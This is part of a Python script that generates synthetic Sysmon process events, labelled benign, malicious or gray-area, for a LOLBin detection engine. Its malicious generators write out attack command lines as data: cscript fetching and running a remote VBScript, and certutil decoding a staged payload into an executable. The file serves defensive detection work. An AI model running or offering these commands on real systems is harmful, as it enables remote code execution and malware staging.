            img = "C:\\Windows\\System32\\cscript.exe"
            script = f"script{random.randint(1, 999)}.vbs"
            cmd = f"cscript.exe //e:vbscript http://{domain}/{script}"
        events.append(make_event(
            image=img, cmdline=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe /c",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1059.005",
            technique_name="WScript Remote Script",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


def _gen_certutil_encode_decode(n: int) -> List[Dict]:
    """T1140 - Certutil base64 encode/decode for payload staging."""
    events = []
    for _ in range(n):
        src = f"C:\\Users\\Public\\encoded{random.randint(100, 9999)}.txt"
        dst = f"C:\\Users\\Public\\decoded{random.randint(100, 9999)}.exe"
        cmd_variants = [
            f"certutil.exe -decode {src} {dst}",
            f"certutil -decode {src} {dst}",
            f"certutil.exe -encode {dst} {src}",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\certutil.exe",
            cmdline=random.choice(cmd_variants),
            parent_image=random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ]),
            parent_cmdline="cmd.exe" if random.random() > 0.5 else "powershell.exe",
            user=random.choice(USERS_NORMAL[:4]),
            integrity="Medium",
            is_malicious=1,
            technique_id="T1140",
            technique_name="Certutil Base64 Decode",
            label="malicious",
            timestamp=_mal_timestamp(),
        ))
    return events


# ─────────────────── GRAY-AREA Event Generators ────────────────

def gen_gray_area_events(count: int = 100) -> List[Dict]:
    """
    Generate legitimate admin actions that resemble attack patterns.
    These stress-test false positive rates — they're NOT malicious but
    share surface-level indicators with known LOLBin abuse.
    """
    events = []
    per_type = max(1, count // 10)

    generators = [
        _gen_gray_certutil_verify,
        _gen_gray_long_powershell,
        _gen_gray_msiexec_internal,
        _gen_gray_rundll32_legit,
        _gen_gray_regsvr32_legit,
        _gen_gray_bitsadmin_wsus,
        _gen_gray_admin_ps_night,
        _gen_gray_schtasks_legit,
        _gen_gray_certutil_hash,
        _gen_gray_wmic_admin,
    ]

    for gen in generators:
        events.extend(gen(per_type))

    random.shuffle(events)
    return events[:count]


def _gen_gray_certutil_verify(n: int) -> List[Dict]:
    """Legitimate certutil certificate verification."""
    events = []
    for _ in range(n):
        cmd_variants = [
            f"certutil.exe -verify -urlfetch C:\\Certs\\server{random.randint(1,20)}.cer",
            f"certutil.exe -verifystore My server{random.randint(1,10)}",
            f"certutil.exe -dump C:\\Certs\\ca_cert.p7b",
        ]
        events.append(make_event(
            image="C:\\Windows\\System32\\certutil.exe",
            cmdline=random.choice(cmd_variants),
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_long_powershell(n: int) -> List[Dict]:
    """Long but unencoded PowerShell admin scripts."""
    events = []
    long_cmds = [
        "powershell.exe -NoProfile -Command \"Get-ADUser -Filter * -Properties LastLogonDate, Department, Title | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select Name, SamAccountName, LastLogonDate, Department | Export-Csv C:\\Reports\\stale_accounts.csv -NoTypeInformation\"",
        "powershell.exe -Command \"Get-WmiObject Win32_Process | Select-Object Name, ProcessId, @{Name='Memory(MB)';Expression={[math]::Round($_.WorkingSetSize/1MB,2)}} | Sort-Object 'Memory(MB)' -Descending | Select -First 20 | Format-Table -AutoSize\"",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\Backup-SharePointSites.ps1 -SiteUrl https://corp.sharepoint.com -OutputPath D:\\Backups",
        "powershell.exe -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\\Reports\\servers.csv\"",
    ]
    for _ in range(n):
        events.append(make_event(
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cmdline=random.choice(long_cmds),
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_msiexec_internal(n: int) -> List[Dict]:
    """MSI install from internal server (URL in command looks suspicious)."""
    events = []
    for _ in range(n):
        server = random.choice(INTERNAL_SERVERS)
        pkg = f"package{random.randint(1,50)}.msi"
        events.append(make_event(
            image="C:\\Windows\\System32\\msiexec.exe",
            cmdline=f"msiexec.exe /i http://{server}/{pkg} /quiet /norestart",
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_rundll32_legit(n: int) -> List[Dict]:
    """Legitimate rundll32 usage (control panel, shell functions)."""
    events = []
    cmds = [
        "rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",
        "rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl",
        "rundll32.exe user32.dll,LockWorkStation",
        "rundll32.exe printui.dll,PrintUIEntry /in /n \\\\printserver\\HP_LaserJet",
        "rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",
    ]
    for _ in range(n):
        events.append(make_event(
            image="C:\\Windows\\System32\\rundll32.exe",
            cmdline=random.choice(cmds),
            parent_image="C:\\Windows\\explorer.exe",
            parent_cmdline="C:\\Windows\\explorer.exe",
            user=random.choice(USERS_NORMAL + USERS_ADMIN),
            integrity="Medium",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_regsvr32_legit(n: int) -> List[Dict]:
    """Legitimate regsvr32 DLL registration."""
    events = []
    dlls = [
        "C:\\Program Files\\Common Files\\Microsoft Shared\\DAO\\dao360.dll",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\GROOVEEX.DLL",
        "C:\\Windows\\System32\\msxml6.dll",
        "C:\\Program Files\\Common Files\\System\\Ole DB\\oledb32.dll",
    ]
    for _ in range(n):
        dll = random.choice(dlls)
        events.append(make_event(
            image="C:\\Windows\\System32\\regsvr32.exe",
            cmdline=f"regsvr32.exe /s {dll}",
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe /c",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_bitsadmin_wsus(n: int) -> List[Dict]:
    """Legitimate BITSAdmin for WSUS/SCCM updates."""
    events = []
    for _ in range(n):
        server = random.choice(INTERNAL_SERVERS[:2])
        pkg = f"update_kb{random.randint(1000000, 9999999)}.cab"
        events.append(make_event(
            image="C:\\Windows\\System32\\bitsadmin.exe",
            cmdline=f"bitsadmin.exe /transfer wsus_update /download /priority normal http://{server}/{pkg} C:\\Windows\\SoftwareDistribution\\Download\\{pkg}",
            parent_image="C:\\Windows\\System32\\svchost.exe",
            parent_cmdline="C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
            user="NT AUTHORITY\\SYSTEM",
            integrity="System",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("any"),
        ))
    return events


def _gen_gray_admin_ps_night(n: int) -> List[Dict]:
    """Legitimate admin PowerShell during maintenance windows (night)."""
    events = []
    night_cmds = [
        "powershell.exe -NoProfile -Command \"Restart-Service -Name W3SVC -Force\"",
        "powershell.exe -Command \"Get-VM | Where-Object {$_.State -eq 'Off'} | Start-VM\"",
        "powershell.exe -File C:\\Scripts\\nightly-backup.ps1",
        "powershell.exe -Command \"Invoke-GPUpdate -Computer DC01 -Force\"",
        "powershell.exe -Command \"Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\\Reports\\security_audit.csv\"",
    ]
    for _ in range(n):
        events.append(make_event(
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cmdline=random.choice(night_cmds),
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("off_hours"),
        ))
    return events


def _gen_gray_schtasks_legit(n: int) -> List[Dict]:
    """Legitimate scheduled task creation."""
    events = []
    tasks = [
        'schtasks.exe /create /tn "NightlyBackup" /tr "C:\\Scripts\\backup.bat" /sc daily /st 02:00',
        'schtasks.exe /create /tn "DiskCleanup" /tr "cleanmgr /sagerun:1" /sc weekly /d MON',
        'schtasks.exe /query /fo TABLE /v',
        'schtasks.exe /run /tn "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"',
    ]
    for _ in range(n):
        events.append(make_event(
            image="C:\\Windows\\System32\\schtasks.exe",
            cmdline=random.choice(tasks),
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_certutil_hash(n: int) -> List[Dict]:
    """Legitimate certutil file hashing."""
    events = []
    files = [
        "C:\\Installers\\setup.exe", "C:\\Downloads\\patch.msi",
        "C:\\Temp\\driver.sys", "C:\\Users\\admin\\Downloads\\tool.exe",
    ]
    algos = ["SHA256", "SHA1", "MD5"]
    for _ in range(n):
        f = random.choice(files)
        algo = random.choice(algos)
        events.append(make_event(
            image="C:\\Windows\\System32\\certutil.exe",
            cmdline=f"certutil.exe -hashfile {f} {algo}",
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


def _gen_gray_wmic_admin(n: int) -> List[Dict]:
    """Legitimate WMIC queries by admin."""
    events = []
    queries = [
        "wmic.exe process list full",
        "wmic.exe os get caption,version,buildnumber",
        "wmic.exe computersystem get model,manufacturer,totalphysicalmemory",
        "wmic.exe diskdrive get model,size,status",
        "wmic.exe service where state='running' get name,pathname",
    ]
    for _ in range(n):
        events.append(make_event(
            image="C:\\Windows\\System32\\wbem\\WMIC.exe",
            cmdline=random.choice(queries),
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_cmdline="cmd.exe",
            user=random.choice(USERS_ADMIN),
            integrity="High",
            is_malicious=0, technique_id="", technique_name="",
            label="gray_area",
            timestamp=workday_timestamp("business"),
        ))
    return events


# ─────────────────────── Main Generator ────────────────────────

def generate_all_data(project_root: str = None):
    """
    Generate complete synthetic dataset and save to multiple formats.
    
    Args:
        project_root: Path to project root directory. If None, auto-detects.
    """
    if project_root is None:
        project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    # Create output directories
    data_dir = os.path.join(project_root, "data")
    raw_dir = os.path.join(data_dir, "raw_logs")
    os.makedirs(raw_dir, exist_ok=True)

    print("=" * 70)
    print("  LOLBins Detection Engine — Synthetic Data Generator")
    print("=" * 70)

    # Generate events
    print("\n[1/3] Generating 800 benign events...")
    benign = gen_benign_events(800)
    print(f"      ✓ Generated {len(benign)} benign events")

    print("[2/3] Generating 100 malicious events...")
    malicious = gen_malicious_events(100)
    print(f"      ✓ Generated {len(malicious)} malicious events")

    print("[3/3] Generating 100 gray-area events...")
    gray_area = gen_gray_area_events(100)
    print(f"      ✓ Generated {len(gray_area)} gray-area events")

    # Combine and shuffle for full dataset
    all_events = benign + malicious + gray_area
    random.shuffle(all_events)

    # Convert to DataFrames
    df_all = pd.DataFrame(all_events)
    df_benign = pd.DataFrame(benign)
    df_malicious = pd.DataFrame(malicious)
    df_gray = pd.DataFrame(gray_area)

    # Save outputs
    print("\n[*] Saving datasets...")

    # JSON (raw logs)
    json_path = os.path.join(raw_dir, "sysmon_events.json")
    with open(json_path, 'w') as f:
        json.dump(all_events, f, indent=2)
    print(f"    ✓ {json_path}")

    # CSV files
    csv_outputs = [
        (os.path.join(raw_dir, "sysmon_events.csv"), df_all),
        (os.path.join(data_dir, "full_dataset.csv"), df_all),
        (os.path.join(data_dir, "benign_baseline.csv"), df_benign),
        (os.path.join(data_dir, "malicious_samples.csv"), df_malicious),
        (os.path.join(data_dir, "gray_area_samples.csv"), df_gray),
    ]
    for path, df in csv_outputs:
        df.to_csv(path, index=False)
        print(f"    ✓ {path}")

    # Print summary statistics
    print("\n" + "=" * 70)
    print("  DATASET SUMMARY")
    print("=" * 70)
    print(f"\n  Total events:     {len(df_all)}")
    print(f"  Benign:           {len(df_benign)} ({len(df_benign)/len(df_all)*100:.1f}%)")
    print(f"  Malicious:        {len(df_malicious)} ({len(df_malicious)/len(df_all)*100:.1f}%)")
    print(f"  Gray-area:        {len(df_gray)} ({len(df_gray)/len(df_all)*100:.1f}%)")

    # Technique breakdown
    if len(df_malicious) > 0:
        print("\n  Malicious Technique Breakdown:")
        technique_counts = df_malicious.groupby(
            ['mitre_technique_id', 'technique_name']).size()
        for (tid, tname), cnt in technique_counts.items():
            print(f"    {tid:12s} {tname:30s} {cnt:3d} events")

    # Timestamp distribution
    df_all['_hour'] = pd.to_datetime(df_all['UtcTime']).dt.hour
    print("\n  Timestamp Distribution (hour of day):")
    for label_name in ['benign', 'malicious', 'gray_area']:
        subset = df_all[df_all['label'] == label_name]
        if len(subset) > 0:
            off_hours = subset[(subset['_hour'] >= 0) & (subset['_hour'] <= 5)]
            business = subset[(subset['_hour'] >= 8) & (subset['_hour'] <= 17)]
            print(f"    {label_name:12s}: business={len(business):3d}, "
                  f"off-hours(0-5am)={len(off_hours):3d}, "
                  f"other={len(subset)-len(business)-len(off_hours):3d}")

    df_all.drop(columns=['_hour'], inplace=True)

    print("\n" + "=" * 70)
    print("  Data generation complete!")
    print("=" * 70)

    return df_all


if __name__ == "__main__":
    generate_all_data()
